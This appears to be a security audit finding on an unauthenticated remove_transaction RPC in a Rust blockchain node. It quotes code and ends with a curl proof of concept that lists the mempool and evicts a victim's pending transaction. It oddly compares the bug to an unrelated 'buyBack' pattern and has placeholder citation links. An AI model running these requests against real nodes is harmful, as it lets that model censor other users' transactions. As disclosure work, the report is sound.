### Title
Unauthenticated `remove_transaction` RPC Allows Any Caller to Evict Any Pending Transaction from the Mempool - (File: `rpc/src/module/pool.rs`)

---

### Summary

The `remove_transaction` RPC method in the `Pool` module performs a destructive mempool operation — evicting a transaction and all its descendants — on behalf of any caller who supplies a `tx_hash`, with no check that the caller is the transaction's submitter or has any authorization over it. This is a direct structural analog to the `buyBack(address destination, ...)` pattern: a public function that acts on a resource owned by another party without verifying the caller's right to do so.

---

### Finding Description

`remove_transaction` is declared in the standard `Pool` RPC module and is enabled by default:

```rust
// rpc/src/module/pool.rs, line 254-255
#[rpc(name = "remove_transaction")]
fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
```

Its implementation unconditionally forwards the hash to the tx-pool service with no identity or ownership check:

```rust
// rpc/src/module/pool.rs, lines 662-669
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();

    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
```

`remove_local_tx` dispatches to `TxPoolService::remove_tx`, which removes the target transaction and all descendants from the pending pool, proposed pool, orphan pool, and verify queue:

```rust
// tx-pool/src/process.rs, lines 440-455
pub(crate) async fn remove_tx(&self, tx_hash: Byte32) -> bool {
    let id = ProposalShortId::from_tx_hash(&tx_hash);
    { let mut queue = self.verify_queue.write().await;
      if queue.remove_tx(&id).is_some() { return true; } }
    { let mut orphan = self.orphan.write().await;
      if orphan.remove_orphan_tx(&id).is_some() { return true; } }
    let mut tx_pool = self.tx_pool.write().await;
    tx_pool.remove_tx(&id)
}
```

There is no caller identity, no ownership record, no signature, and no capability token checked at any layer between the RPC handler and the pool mutation.

---

### Impact Explanation

Any RPC caller who can reach the JSON-RPC endpoint — which is the standard interface for DApp backends, wallets, and public infrastructure nodes — can:

1. **Targeted transaction eviction**: Supply any known `tx_hash` (all pending tx hashes are publicly enumerable via `get_raw_tx_pool`) and permanently remove that transaction and its entire descendant chain from the local node's mempool.
2. **Sustained DoS against a specific transaction**: Because the tx_hash is deterministic and the pool has no memory of "who submitted this," the attacker can re-call `remove_transaction` every time the victim resubmits, preventing confirmation indefinitely on that node.
3. **Descendant chain destruction**: `remove_entry_and_descendants` is called, so a single call can evict an entire CPFP chain, not just one transaction.

This does not allow fund theft, but it causes unauthorized, irreversible state changes to another user's pending transaction — exactly the impact class of the reference report ("unwanted buy backs" → "unwanted transaction evictions").

---

### Likelihood Explanation

- The `Pool` module is a standard, non-test RPC module enabled by default. Unlike `Integration_test` methods (`process_block_without_verify`, `truncate`, `generate_block`), `remove_transaction` is part of the production API surface.
- All pending tx hashes are publicly readable via `get_raw_tx_pool` with no authentication, giving the attacker a complete target list.
- Node operators routinely expose the RPC endpoint for DApp integration. Any client that can call `send_transaction` can equally call `remove_transaction`.
- No rate limiting, no caller identity, no ownership record exists anywhere in the call path.

---

### Recommendation

Add an ownership record at submission time (e.g., a caller token or a per-tx submitter tag stored in the pool entry) and verify it in `remove_transaction`. Alternatively, restrict `remove_transaction` to the `Integration_test` module (alongside `truncate`, `process_block_without_verify`) so it is disabled on production nodes by default, consistent with how other destructive node-management operations are gated.

---

### Proof of Concept

```
# Step 1: Victim submits a transaction
curl -X POST http://<node-rpc>/  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"send_transaction","params":[<victim_tx>, "passthrough"]}'
# Returns: {"result": "0xVICTIM_TX_HASH"}

# Step 2: Attacker enumerates the pool (no auth required)
curl -X POST http://<node-rpc>/  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false]}'
# Returns all pending tx hashes including 0xVICTIM_TX_HASH

# Step 3: Attacker removes the victim's transaction (no auth required)
curl -X POST http://<node-rpc>/  -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"remove_transaction","params":["0xVICTIM_TX_HASH"]}'
# Returns: {"result": true}
# Victim's transaction and all descendants are now evicted from the pool.
```

**Relevant code locations:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** rpc/src/module/pool.rs (L254-255)
```rust
    #[rpc(name = "remove_transaction")]
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** tx-pool/src/service.rs (L272-275)
```rust
    /// Remove tx from tx-pool
    pub fn remove_local_tx(&self, tx_hash: Byte32) -> Result<bool, AnyError> {
        send_message!(self, RemoveLocalTx, tx_hash)
    }
```

**File:** tx-pool/src/process.rs (L440-455)
```rust
    pub(crate) async fn remove_tx(&self, tx_hash: Byte32) -> bool {
        let id = ProposalShortId::from_tx_hash(&tx_hash);
        {
            let mut queue = self.verify_queue.write().await;
            if queue.remove_tx(&id).is_some() {
                return true;
            }
        }
        {
            let mut orphan = self.orphan.write().await;
            if orphan.remove_orphan_tx(&id).is_some() {
                return true;
            }
        }
        let mut tx_pool = self.tx_pool.write().await;
        tx_pool.remove_tx(&id)
```

**File:** tx-pool/src/pool.rs (L358-361)
```rust
    pub(crate) fn remove_tx(&mut self, id: &ProposalShortId) -> bool {
        let entries = self.pool_map.remove_entry_and_descendants(id);
        !entries.is_empty()
    }
```
